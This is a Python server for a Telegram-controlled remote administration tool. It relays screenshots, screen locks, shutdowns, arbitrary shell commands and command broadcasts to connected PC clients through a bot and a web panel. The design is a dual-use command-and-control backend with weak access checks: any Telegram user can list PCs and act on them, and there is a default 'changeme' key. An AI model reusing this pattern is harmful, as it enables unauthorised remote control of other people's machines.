"""
Central Server
==============
- Admin users: full command access via /send, /scripts, /intercept, etc.
- Normal users: type PC name → get 3 buttons: Screenshot / Lock / Shutdown
- Admin panel at /admin (web UI)
Deploy on Railway / Render.
"""

import asyncio, json, os, logging
from datetime import datetime
from typing import Optional

import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("server")

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG  (set as environment variables on Railway)
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.environ["BOT_TOKEN"]
ADMIN_IDS  = set(map(int, os.environ.get("ADMIN_IDS", "").split(",")))
SECRET_KEY = os.environ.get("SECRET_KEY", "changeme")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://localhost:8080")
PORT       = int(os.environ.get("PORT", 8080))

# ─────────────────────────────────────────────────────────────────────────────
# STATE
# ─────────────────────────────────────────────────────────────────────────────
clients:   dict[str, dict] = {}   # name → {ws, last_seen}
history:   list[dict]      = []
intercepts: dict[str, str] = {}

# Normal users waiting to pick a PC (user_id → None = awaiting name input)
# user_id → script_name (once they've unlocked a PC)
user_sessions: dict[int, Optional[str]] = {}


def now_str():
    return datetime.utcnow().strftime("%H:%M:%S")

def add_history(src, script, cmd, result="pending"):
    history.append({"time": now_str(), "from": src, "script": script,
                    "command": cmd, "result": result})
    if len(history) > 300: history.pop(0)


# ─────────────────────────────────────────────────────────────────────────────
# WEBSOCKET — client connections
# ─────────────────────────────────────────────────────────────────────────────
async def ws_handler(request: web.Request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    name: Optional[str] = None

    async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
            try: data = json.loads(msg.data)
            except: continue

            kind = data.get("type")

            if kind == "register":
                if data.get("secret") != SECRET_KEY:
                    await ws.send_json({"type": "error", "msg": "bad secret"})
                    await ws.close(); return ws
                name = data["name"]
                clients[name] = {"ws": ws, "last_seen": now_str()}
                log.info(f"[+] {name} connected")
                await ws.send_json({"type": "ok", "msg": f"Registered as {name}"})

            elif kind == "result":
                cmd    = data.get("command", "")
                result = data.get("result", "")
                add_history("client", name, cmd, result)
                log.info(f"[result] {name}: {cmd!r} → {result[:80]!r}")
                if "reply_chat_id" in data:
                    await send_tg(data["reply_chat_id"],
                                  f"✅ *{name}* › `{cmd}`\n```\n{result[:3000]}\n```")

            elif kind == "ping":
                if name: clients[name]["last_seen"] = now_str()
                await ws.send_json({"type": "pong"})

        elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
            break

    if name and name in clients:
        del clients[name]
        log.info(f"[-] {name} disconnected")
    return ws


async def send_command(script_name: str, command: str, reply_chat_id: int = None):
    if script_name not in clients:
        return False, "Script not connected."
    ws = clients[script_name]["ws"]
    payload = {"type": "command", "command": command}
    if reply_chat_id: payload["reply_chat_id"] = reply_chat_id
    await ws.send_json(payload)
    add_history("server", script_name, command)
    return True, "sent"


# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM HELPERS
# ─────────────────────────────────────────────────────────────────────────────
_app: Application = None

async def send_tg(chat_id: int, text: str, reply_markup=None):
    if _app:
        try:
            await _app.bot.send_message(chat_id=chat_id, text=text,
                                        parse_mode="Markdown",
                                        reply_markup=reply_markup)
        except Exception as e:
            log.warning(f"send_tg error: {e}")

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


# ─────────────────────────────────────────────────────────────────────────────
# NORMAL USER FLOW
# Three big buttons: Screenshot / Lock / Shutdown
# ─────────────────────────────────────────────────────────────────────────────

def user_buttons(script_name: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸  Screenshot", callback_data=f"u:screenshot:{script_name}")],
        [InlineKeyboardButton("🔒  Lock Screen", callback_data=f"u:lock:{script_name}")],
        [InlineKeyboardButton("🔴  Shut Down",   callback_data=f"u:shutdown:{script_name}")],
    ])

async def handle_user_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Non-admin users: ask them to type their PC name."""
    uid = update.effective_user.id
    user_sessions[uid] = None   # mark as "waiting for PC name"
    await update.message.reply_text(
        "👋 Welcome!\n\n"
        "Type the *name of your PC* to connect to it.\n"
        "_(e.g.  brothers\\_pc  or  office\\_pc)_",
        parse_mode="Markdown"
    )

async def handle_user_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle normal user typing a PC name."""
    uid  = update.effective_user.id
    text = update.message.text.strip()

    if uid not in user_sessions or user_sessions[uid] is not None:
        # Not in setup flow — ignore
        return

    # Check if the typed name matches a connected script
    if text in clients:
        user_sessions[uid] = text
        await update.message.reply_text(
            f"✅ Connected to *{text}*!\n\nChoose what you want to do:",
            parse_mode="Markdown",
            reply_markup=user_buttons(text)
        )
    else:
        # List connected PCs to help
        connected = list(clients.keys())
        hint = ""
        if connected:
            hint = "\n\nConnected PCs right now:\n" + "\n".join(f"• `{c}`" for c in connected)
        await update.message.reply_text(
            f"❌ No PC named *{text}* is online right now.{hint}\n\nTry again:",
            parse_mode="Markdown"
        )

async def handle_user_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle button presses from normal users."""
    query = update.callback_query
    await query.answer()
    uid  = query.from_user.id
    data = query.data

    if not data.startswith("u:"):
        return

    _, action, script_name = data.split(":", 2)

    if script_name not in clients:
        await query.edit_message_text(
            f"❌ *{script_name}* is no longer connected.\nSend /start to try again.",
            parse_mode="Markdown"
        )
        user_sessions.pop(uid, None)
        return

    command_map = {
        "screenshot": "screenshot",
        "lock":       "lock",
        "shutdown":   "shutdown 30",
    }
    labels = {
        "screenshot": "📸 Taking screenshot...",
        "lock":       "🔒 Locking screen...",
        "shutdown":   "🔴 Shutting down in 30s... (use cancel to abort)",
    }

    command = command_map.get(action)
    if not command: return

    await query.edit_message_text(
        f"{labels[action]}\n\n_(You'll get the result here)_",
        parse_mode="Markdown"
    )
    await send_command(script_name, command, query.message.chat_id)

    # Restore buttons after a moment
    await asyncio.sleep(3)
    try:
        await _app.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"Connected to *{script_name}* — choose another action:",
            parse_mode="Markdown",
            reply_markup=user_buttons(script_name)
        )
    except: pass


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_admin(uid):
        await update.message.reply_text(
            "🖥 *Admin Control Centre*\n\n"
            "/scripts — list connected PCs\n"
            "/send script1 command — send command\n"
            "/intercept script1 command — override next command\n"
            "/history — last commands\n"
            "/broadcast command — send to ALL scripts\n"
            "/panel — open web admin panel",
            parse_mode="Markdown"
        )
    else:
        await handle_user_start(update, ctx)

async def cmd_scripts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not clients:
        await update.message.reply_text("No scripts connected."); return
    lines = ["📡 *Connected scripts:*"]
    for name, info in clients.items():
        inter = f"\n    ⚡ intercept: `{intercepts[name]}`" if name in intercepts else ""
        lines.append(f"• `{name}` — last seen {info['last_seen']}{inter}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/send <script> <command>`", parse_mode="Markdown"); return
    script_name = args[0]
    command     = " ".join(args[1:])
    if script_name in intercepts:
        command = intercepts.pop(script_name)
        await update.message.reply_text(f"ℹ️ Intercept active → sending `{command}`", parse_mode="Markdown")
    ok, msg = await send_command(script_name, command, update.effective_chat.id)
    status  = f"📤 Sent `{command}` → `{script_name}`" if ok else f"❌ {msg}"
    await update.message.reply_text(status, parse_mode="Markdown")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast <command>`", parse_mode="Markdown"); return
    command = " ".join(ctx.args)
    if not clients:
        await update.message.reply_text("No scripts connected."); return
    sent = []
    for name in clients:
        ok, _ = await send_command(name, command, update.effective_chat.id)
        if ok: sent.append(name)
    await update.message.reply_text(
        f"📡 Broadcast `{command}` → {len(sent)} scripts: {', '.join(f'`{s}`' for s in sent)}",
        parse_mode="Markdown"
    )

async def cmd_intercept(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/intercept <script> <command>`", parse_mode="Markdown"); return
    script_name, command = args[0], " ".join(args[1:])
    intercepts[script_name] = command
    await update.message.reply_text(
        f"⚡ Next command for `{script_name}` → `{command}`", parse_mode="Markdown"
    )

async def cmd_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not history:
        await update.message.reply_text("No history."); return
    lines = ["📜 *Last 15 commands:*"]
    for h in history[-15:][::-1]:
        lines.append(f"`{h['time']}` [{h['from']}→{h['script']}] `{h['command']}` → {h['result'][:60]}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text(f"🌐 Admin panel:\n{PUBLIC_URL}/admin")


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN WEB PANEL
# ─────────────────────────────────────────────────────────────────────────────
PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Remote Admin Panel</title>
<style>
  :root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#e6edf3;--muted:#8b949e;--accent:#58a6ff;--green:#3fb950;--red:#f85149;--amber:#d29922}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;padding:20px}
  h1{font-size:1.3rem;margin-bottom:18px;display:flex;align-items:center;gap:10px}
  h1 span{font-size:1.5rem}
  h2{font-size:.8rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:10px}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px}
  .card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px}
  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block;margin-right:6px;animation:pulse 2s infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
  .badge{font-size:.7rem;padding:2px 7px;border-radius:20px;background:#58a6ff15;color:var(--accent);border:1px solid #58a6ff30}
  .intercept-badge{background:#d2992215;color:var(--amber);border-color:#d2992230;margin-left:6px}
  input,select{width:100%;padding:9px 12px;border-radius:7px;border:1px solid var(--border);background:#0d1117;color:var(--text);font-size:.9rem;margin-bottom:8px;outline:none}
  input:focus,select:focus{border-color:var(--accent)}
  .btn{padding:9px 16px;border-radius:7px;border:none;cursor:pointer;font-size:.88rem;font-weight:600;width:100%;transition:opacity .15s}
  .btn:hover{opacity:.8}
  .btn-primary{background:var(--accent);color:#0d1117}
  .btn-danger{background:var(--red);color:#fff;margin-top:6px}
  .btn-warn{background:var(--amber);color:#0d1117;margin-top:6px}
  .log{font-size:.75rem;font-family:'SF Mono',Consolas,monospace;color:var(--muted);max-height:200px;overflow-y:auto;display:flex;flex-direction:column-reverse}
  .log div{padding:4px 0;border-bottom:1px solid var(--border)18}
  .t-acc{color:var(--accent)} .t-green{color:var(--green)} .t-red{color:var(--red)} .t-amb{color:var(--amber)}
  #toast{position:fixed;top:18px;right:18px;background:var(--green);color:#0d1117;padding:10px 18px;border-radius:8px;display:none;font-weight:700;z-index:999}
  .script-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)20}
  .script-row:last-child{border:none}
  .script-name{font-weight:600;font-size:.95rem}
  .quick-btn{padding:4px 10px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text);cursor:pointer;font-size:.75rem;margin-left:4px}
  .quick-btn:hover{background:var(--border)}
  @media(max-width:620px){.grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<h1><span>🖥</span> Remote Admin Panel</h1>
<div class="grid">
  <div class="card">
    <h2>Connected Scripts</h2>
    <div id="scripts-list"><span style="color:var(--muted)">Loading…</span></div>
  </div>
  <div class="card">
    <h2>Send Command</h2>
    <select id="sel-script"><option value="">— select script —</option></select>
    <input id="cmd" placeholder="Command (e.g. status, screenshot, shell dir)" />
    <button class="btn btn-primary" onclick="sendCmd()">▶ Send Command</button>
    <div style="margin-top:14px">
      <h2 style="margin-bottom:6px">Set Intercept</h2>
      <input id="intercept-cmd" placeholder="Command to intercept with" />
      <button class="btn btn-warn" onclick="setIntercept()">⚡ Set Intercept for Script</button>
    </div>
    <div style="margin-top:14px">
      <h2 style="margin-bottom:6px">Broadcast to ALL Scripts</h2>
      <input id="broadcast-cmd" placeholder="e.g. status or notify hello" />
      <button class="btn btn-danger" onclick="broadcastCmd()">📡 Broadcast</button>
    </div>
  </div>
</div>
<div class="card">
  <h2>Command History</h2>
  <div class="log" id="log"></div>
</div>
<div id="toast">✓ Done</div>
<script>
const KEY = localStorage.getItem('akey') || prompt('Enter your SECRET_KEY:');
localStorage.setItem('akey', KEY);

async function api(path, body=null){
  const opts = body
    ? {method:'POST',headers:{'Content-Type':'application/json','X-Admin-Key':KEY},body:JSON.stringify(body)}
    : {headers:{'X-Admin-Key':KEY}};
  const r = await fetch(path, opts);
  return r.json();
}

function toast(msg='Done'){
  const t=document.getElementById('toast');
  t.textContent='✓ '+msg; t.style.display='block';
  setTimeout(()=>t.style.display='none',2000);
}

const QUICK_CMDS = ['status','screenshot','cpu','ram','disk','lock','screenshot'];

async function refresh(){
  const d = await api('/api/status');
  const sl = document.getElementById('scripts-list');
  const sel = document.getElementById('sel-script');
  const prev = sel.value;
  sel.innerHTML = '<option value="">— select script —</option>';

  if(!d.scripts||d.scripts.length===0){
    sl.innerHTML='<span style="color:var(--muted)">None connected</span>';
  } else {
    sl.innerHTML = d.scripts.map(s=>`
      <div class="script-row">
        <div>
          <span class="dot"></span>
          <span class="script-name">${s.name}</span>
          <span class="badge" style="margin-left:6px">last ${s.last_seen}</span>
          ${s.intercept?`<span class="badge intercept-badge">⚡ ${s.intercept}</span>`:''}
        </div>
        <div>
          ${QUICK_CMDS.slice(0,3).map(c=>`<button class="quick-btn" onclick="quickSend('${s.name}','${c}')">${c}</button>`).join('')}
        </div>
      </div>`).join('');
    d.scripts.forEach(s=>{
      const o=document.createElement('option');
      o.value=s.name; o.textContent=s.name;
      sel.appendChild(o);
    });
    if(prev) sel.value=prev;
  }

  document.getElementById('log').innerHTML=(d.history||[]).slice(-60).reverse().map(h=>
    `<div>[<span class="t-acc">${h.time}</span>] <span class="t-amb">${h.from}→${h.script}</span> <b>${h.command}</b> <span class="t-green">${h.result.slice?.(0,80)||''}</span></div>`
  ).join('');
}

async function quickSend(script, cmd){
  await api('/api/send',{script,command:cmd});
  toast(`${cmd} → ${script}`); refresh();
}

async function sendCmd(){
  const script=document.getElementById('sel-script').value;
  const cmd=document.getElementById('cmd').value.trim();
  if(!script||!cmd){alert('Select a script and enter a command.');return;}
  await api('/api/send',{script,command:cmd});
  document.getElementById('cmd').value='';
  toast(); refresh();
}

async function setIntercept(){
  const script=document.getElementById('sel-script').value;
  const cmd=document.getElementById('intercept-cmd').value.trim();
  if(!script||!cmd){alert('Select script and enter intercept command.');return;}
  await api('/api/intercept',{script,command:cmd});
  document.getElementById('intercept-cmd').value='';
  toast('Intercept set'); refresh();
}

async function broadcastCmd(){
  const cmd=document.getElementById('broadcast-cmd').value.trim();
  if(!cmd||!confirm(`Broadcast "${cmd}" to ALL connected scripts?`)) return;
  await api('/api/broadcast',{command:cmd});
  document.getElementById('broadcast-cmd').value='';
  toast('Broadcast sent'); refresh();
}

refresh(); setInterval(refresh,3000);
</script>
</body>
</html>"""


def chk(r: web.Request) -> bool:
    return r.headers.get("X-Admin-Key") == SECRET_KEY

async def h_panel(r):
    return web.Response(text=PANEL_HTML, content_type="text/html")

async def h_status(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    scripts = [{"name": n, "last_seen": i["last_seen"], "intercept": intercepts.get(n)}
               for n, i in clients.items()]
    return web.json_response({"scripts": scripts, "history": history})

async def h_send(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data = await r.json()
    script, command = data.get("script"), data.get("command")
    if script in intercepts: command = intercepts.pop(script)
    ok, msg = await send_command(script, command)
    return web.json_response({"ok": ok, "msg": msg})

async def h_intercept(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data = await r.json()
    intercepts[data["script"]] = data["command"]
    return web.json_response({"ok": True})

async def h_broadcast(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data    = await r.json()
    command = data.get("command", "")
    sent = []
    for name in list(clients.keys()):
        ok, _ = await send_command(name, command)
        if ok: sent.append(name)
    return web.json_response({"ok": True, "sent": sent})


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def main():
    global _app

    _app = Application.builder().token(BOT_TOKEN).build()

    # Admin commands
    _app.add_handler(CommandHandler("start",     cmd_start))
    _app.add_handler(CommandHandler("scripts",   cmd_scripts))
    _app.add_handler(CommandHandler("send",      cmd_send))
    _app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    _app.add_handler(CommandHandler("intercept", cmd_intercept))
    _app.add_handler(CommandHandler("history",   cmd_history))
    _app.add_handler(CommandHandler("panel",     cmd_panel))

    # Normal user: button callbacks
    _app.add_handler(CallbackQueryHandler(handle_user_callback, pattern=r"^u:"))

    # Normal user: text messages (PC name input)
    _app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_message))

    await _app.initialize()
    await _app.start()

    # Telegram polling loop
    async def poll():
        offset = None
        while True:
            try:
                updates = await _app.bot.get_updates(offset=offset, timeout=10,
                                                     allowed_updates=["message","callback_query"])
                for u in updates:
                    offset = u.update_id + 1
                    await _app.process_update(Update.de_json(u.to_dict(), _app.bot))
            except Exception as e:
                log.warning(f"Poll error: {e}")
            await asyncio.sleep(1)

    asyncio.create_task(poll())

    # Web server
    web_app = web.Application()
    web_app.router.add_get("/ws",            ws_handler)
    web_app.router.add_get("/admin",         h_panel)
    web_app.router.add_get("/api/status",    h_status)
    web_app.router.add_post("/api/send",     h_send)
    web_app.router.add_post("/api/intercept",h_intercept)
    web_app.router.add_post("/api/broadcast",h_broadcast)

    runner = web.AppRunner(web_app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    log.info(f"Server on port {PORT}. Admin panel: {PUBLIC_URL}/admin")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
